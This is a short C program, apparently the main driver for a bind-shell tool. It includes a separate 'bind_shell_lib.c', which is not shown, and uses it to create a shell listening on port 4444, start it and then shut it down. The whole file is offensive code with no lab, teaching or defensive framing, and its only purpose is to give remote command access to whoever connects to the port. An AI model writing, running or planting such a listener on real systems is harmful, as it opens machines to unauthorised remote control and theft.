#include <stdio.h>
#include <stdlib.h>
#include "bind_shell_lib.c"

int main(void) {
    BINDSHELL* sh = create_shell(4444);
    if(sh != NULL)
        start_shell(sh);
    kill_shell(sh);
}
